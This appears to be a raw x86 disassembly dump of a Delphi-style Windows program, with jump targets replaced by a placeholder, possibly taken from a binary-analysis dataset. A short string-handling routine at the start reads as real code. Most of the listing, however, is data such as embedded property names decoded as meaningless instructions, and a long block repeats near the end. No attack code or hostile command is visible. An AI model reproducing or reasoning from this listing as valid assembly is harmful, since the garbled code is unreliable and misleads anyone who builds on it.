jne r-xdata
sub_4899e0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_489ba6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx edi
call sub_40408c
mov eax esi
call sub_4042f8
test eax eax
jle r-xdata
mov eax esi
call sub_4042f8
mov edx eax
mov eax esi
call sub_489770
mov edi eax
mov eax [ ebx ]
call sub_4042f8
cmp edi eax
je r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x1
mov eax [ ebx ]
call sub_4042f8
test eax eax
jle r-xdata
mov eax [ ebx ]
call sub_4042f8
inc eax
push eax
sub edi [ ebp - 0x8 ]
push edi
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ ebx ]
mov eax esi
call sub_489848
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_40408c
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_489770
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
call sub_4042f8
inc eax
mov [ ebp - 0xc ] eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebx ]
call sub_4042f8
sub eax edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489bad
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_40405c
retn
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x1
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4891e8
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebx ]
call sub_4042f8
cmp eax [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
dec edx
mov eax esi
call sub_489820
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
inc edi
mov eax [ ebp - 0x10 ]
sub eax edi
push eax
mov al [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov edx [ ebx ]
mov eax esi
call sub_489848
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_40408c
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_4893b8
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_404220
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_404300
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
mov eax ebx
call j_sub_404504#2
mov edx [ ebp - 0x10 ]
mov cl [ ebp - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0x14 ]
mov al [ esi + eax - 0x1 ]
call sub_4893b8
mov edx [ ebx ]
cmp al [ edx + edi - 0x1 ]
jne r-xdata
sub_489bb8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_489bdd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489be4
retn
sub_489dc4
mov ebx 0xd0ffbaff
test al 0x48
add ah ch
test al 0x48
add [ ecx + ebp * 4 + 0x48 ] cl
add [ eax - 0x4bffb755 ] al
stosd [ edi ]
dec eax
add ah bh
mov bh 0x48
inc eax
xor al [ eax ]
pop esp
xor al [ eax ]
or bh ch
je r-xdata
arpl [ eax + eax + 0x10 ] si
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or [ ebp + ecx * 2 + 0x61 ] edx
jae r-xdata
inc esp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
inc esp
insd
dec ebp
popad
jae r-xdata
fadd [ esi + 0x1650044 ]
add bh bh
inc eax
inc ebp
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
inc ebp
imul esi [ fs : esp + edi * 2 - 0x62 ] 0x9e080048
dec eax
add [ eax ] al
add al 0x4d
popad
jae r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] cl
out dx eax
inc ebp
imul esi [ fs : esp + ecx - 0x62 ] 0xf070048
push esp
inc ebx
jne r-xdata
adc eax 0x6f420b00
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0x60ff0001
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ edx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
add bh bh
adc [ esi ] bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
les eax [ gs : esi + 0x1620044 ]
xor eax 0x4477a400
add [ ecx ] ah
add bh bh
mov al [ 0x3c0044bb ]
mov esp 0x44
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] bl
pop [ ecx ]
sub cl 0x44
add [ edi * 4 - 0xf53ffbc ] bl
je r-xdata
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
jb r-xdata
add [ eax ] al
push ss
add [ eax ] cl
inc ebx
push 0x61437261
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
cwde
leave
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
xchg [ eax + eax + 0x63 ] al
add [ eax ] eax
dec esp
cmp eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add bh bh
int3
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
add [ edi + ecx * 4 ] ah
insd
dec ebp
popad
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
je r-xdata
inc esp
in al 0x6f
and [ esi ] 0x42
add [ eax ] dh
add bh bh
adc al 0xca
inc esp
add [ eax ] dh
0x44
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xbc65646f
and eax [ esi ]
or al 0x2
insb
dec edi
jne r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
and al 0x8f
inc ebp
imul esi [ fs : eax + ebx * 4 - 0x64 ] 0xe9900048
inc ebx
add [ eax + eax ] cl
add al 0x4d
popad
jae r-xdata
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x700ffff ] ah
xor [ ebp ] eax
sbb al 0x32
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050019 ] al
je r-xdata
insb
shl bh 0x1
inc ebx
add [ ebx ] dl
add al [ eax ]
jmp [ eax + 0x28 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
cmp al 0x28
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
add [ eax ] al
adc al [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
add [ eax ] al
xchg [ eax + eax + 0x64 ] al
add [ eax ] eax
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax ] dl
cmpsd [ esi ] [ edi ]
dec eax
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ eax ] ch
sub [ eax + eax + 0x54 ] al
mov esp 0xc7d00044
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ edx + ecx * 8 + 0x44 ] bl
add [ eax ] cl
leave
inc esp
add ah cl
or al [ ebp ]
add ah ch
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add [ ecx + esi * 8 ] ah
inc esp
add [ eax + 0x580044f7 ] bh
add eax 0x2c640045
inc esp
add [ eax ] ah
sub eax 0x2d900044
inc esp
add al dh
add eax 0x5f40045
inc ebp
add [ esp + eax + 0x2e340045 ] ch
inc esp
add ah cl
xor [ ebp ] al
pushfd
push cs
inc ebp
add al al
inc edx
inc ebp
add [ eax + 0x2d ] cl
inc ebp
add [ eax ] bh
xor [ ebp ] al
or [ eax ] ch
inc esp
add [ edx + ebp + 0x44 ] al
add [ eax ] al
sub al [ eax + eax - 0x38 ]
sub eax [ eax + eax + 0x74 ]
sub al [ eax + eax + 0x24 ]
sub al [ eax + eax + 0x6c ]
mov cl 0x48
add [ ebx + ebp ] ch
inc esp
add [ ecx + esi * 4 + 0x48 ] dh
add [ eax - 0x4f ] bh
dec eax
add ah ah
ror [ eax ] 0x28
mov edx 0xb9880048
dec eax
add [ ecx ] cl
push esp
dec ebp
popad
jae r-xdata
add [ eax ] al
mov eax eax
jl r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp + 0x6f ]
push [ eax - 0x53 ]
jae r-xdata
dec esp
cmp eax 0x10045
add [ eax ] al
add [ eax ] eax
add [ eax ] al
inc esp
add [ ecx + eax ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xchg [ eax + eax + 0x65 ] al
add [ eax ] eax
inc [ eax + 0x3e ]
inc ebp
add [ ecx + edi * 4 + 0x48 ] dl
add [ eax + edi * 4 - 0x46e3ffb8 ] cl
dec eax
add [ edi + 0x48 ] ah
add [ eax + ebp * 4 + 0x48 ] al
add [ eax + ebp * 4 + 0x540f0048 ] dl
inc ebx
jne r-xdata
dec esp
test eax 0xab800048
dec eax
add [ ebx + ebp * 4 - 0x4803ffb8 ] dh
dec eax
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x489f ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x61 ] bh
dec eax
add [ eax + 0x2 ] al
add [ eax ] al
dec esp
pushfd
dec eax
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x2f580040 ] al
add [ eax ] al
add [ ebx ] ah
add [ esi ] cl
test [ eax + eax - 0x7c ] eax
add [ eax ] eax
inc [ ecx + eax + 0x1ff00 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] al
pop es
dec ecx
insd
dec ebp
outsd
or al 0x86
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070021 ] al
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add [ esi + ebp * 4 ] bh
dec eax
add [ esi + ebp * 4 + 0x48 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or [ ebp + 0x61 ] ecx
js r-xdata
add bh bh
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec ebx
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4508001e ] al
imul esi [ fs : ebp + ecx * 2 + 0x61 ] 0x2b206b73
inc edx
add [ eax ] ch
add bh bh
push 0x780044c9
leave
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001f ] al
outsd
outsb
je r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
jo r-xdata
outsb
je r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
jb r-xdata
add [ ebx ] cl
push eax
popad
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
adc [ eax ] al
push eax
add [ eax ] al
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
test eax 0x28ff0001
xor al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
and eax 0x61500b00
push esp
xor al [ ebp ]
aam 0x32
outsb
jne r-xdata
ja r-xdata
ja r-xdata
adc [ eax ] al
0xe8ff0000 0x44c9
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
push eax
popad
jb r-xdata
push cs
je r-xdata
adc [ eax ] al
push cs
add al [ eax ]
inc esp
sub [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec eax
add al ch
test eax 0xaa7c0048
dec eax
add [ edx + esi + 0x45 ] dl
add ah dl
xor al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
je r-xdata
jb r-xdata
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
popad
jae r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov al [ 0x10044c9 ]
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
inc esp
leave
inc esp
add [ ecx + ecx * 8 + 0x44 ] cl
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
xchg esp eax
mov [ eax + eax + 0x40 ] 0x44e9
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xb4656c62
pop edx
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
outsb
inc ebx
push 0x65676e61
mov ah 0x5a
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
mov ah 0x5a
jb r-xdata
add [ eax + 0x1 ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] cl
push ebx
push 0x6948776f
outsb
inc ebx
push 0xc4287261
push 0x6948776f
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
les edx [ ecx - 0x5617ffb8 ]
dec eax
add [ edx + ebp * 4 + 0x48 ] bh
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
xchg ecx eax
inc ebp
add [ eax + eax ] bh
[ eax + ecx * 8 ]
sub [ eax ] al
adc [ eax ] al
or eax 0x3cff0002
sub [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec ebx
jns r-xdata
mov ah 0x5a
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop edx
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
mov ah 0x5a
jpe r-xdata
loopne r-xdata
jo r-xdata
jns r-xdata
xor [ edx + 0x44 ] bh
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
pop edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060037 ] al
arpl [ ebx - 0x64 ] bp
jpo r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
outsb
dec ebp
outsd
jne r-xdata
jns r-xdata
push ebp
jo r-xdata
add al bl
add [ eax ] al
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
je r-xdata
add [ eax + 0x4f070036 ] al
add [ eax ] al
dec edi
jbe r-xdata
add al [ eax ]
add [ ecx + rw-data ] ah
arpl [ ebx + 0x54 ] bp
jpo r-xdata
inc esp
outsd
ja r-xdata
add al dl
add [ eax ] al
call eax
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
mov esi eax
xor edx edx
mov eax esi
call sub_442760
mov al [ r-xdata ]
jge r-xdata
mov ebx edx
add esp 0xfffffff0
call sub_40360c
dec edi
or [ ecx + 0x44 ] bh
add al ah
add [ eax ] al
jmp eax
in al 0x79
inc esp
add al ch
add [ eax ] eax
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ esi ] al
dec edi
jns r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
cmp [ ecx + 0x44 ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003e ] al
outsb
push ebx
je r-xdata
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
jb r-xdata
add al bl
add [ eax ] eax
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe947a51c
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
jpo r-xdata
add esp 0xc
add eax 0x0
jb r-xdata
pop [ fs : 0x0 ]
mov [ ebx + ebx * 8 + 0x16e80f74 ] 0x8f
idiv edi
jb r-xdata
mov eax ebx
call sub_48ac9c
mov edx esi
mov cl [ esp ]
mov eax ebx
popad
ja r-xdata
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090034 ] al
outsb
inc ebp
outsb
mov ebx 0x23c
add [ ebp + 0xc ] dh
nop
push ebx
push esi
test dl dl
je r-xdata
inc esp
outsd
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
call sub_451ee4
test al al
je r-xdata
dec [ ebx + 0x512e8c3 ]
add [ eax ] al
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_48b378
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_48b610
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_48b12c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_48b6e0
sub_48a119
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc ebx
push 0x61437261
jae r-xdata
inc esp
in al 0x6f
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
and [ esi ] 0x42
add [ eax ] dh
add bh bh
adc al 0xca
inc esp
add [ eax ] dh
0x44
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
push [ eax - 0x53 ]
jae r-xdata
add [ eax ] al
add [ ebx ] ah
add [ esi ] cl
test [ eax + eax - 0x7c ] eax
add [ eax ] eax
inc [ ecx + eax + 0x1ff00 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] al
pop es
dec ecx
insd
dec ebp
outsd
or al 0x86
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070021 ] al
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add [ esi + ebp * 4 ] bh
dec eax
add [ esi + ebp * 4 + 0x48 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or [ ebp + 0x61 ] ecx
js r-xdata
add bh bh
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
dec ebx
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4508001e ] al
imul esi [ fs : ebp + ecx * 2 + 0x61 ] 0x2b206b73
inc edx
add [ eax ] ch
add bh bh
push 0x780044c9
leave
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001f ] al
outsd
outsb
je r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
jo r-xdata
outsb
je r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
jb r-xdata
add [ ebx ] cl
push eax
popad
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
adc [ eax ] al
push eax
add [ eax ] al
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
test eax 0x28ff0001
xor al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
and eax 0x61500b00
push esp
xor al [ ebp ]
aam 0x32
outsb
jne r-xdata
ja r-xdata
ja r-xdata
adc [ eax ] al
0xe8ff0000 0x44c9
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
push eax
popad
jb r-xdata
push cs
je r-xdata
adc [ eax ] al
push cs
add al [ eax ]
inc esp
sub [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec eax
add al ch
test eax 0xaa7c0048
dec eax
add [ edx + esi + 0x45 ] dl
add ah dl
xor al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
je r-xdata
jb r-xdata
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
popad
jae r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov al [ 0x10044c9 ]
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
inc esp
leave
inc esp
add [ ecx + ecx * 8 + 0x44 ] cl
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
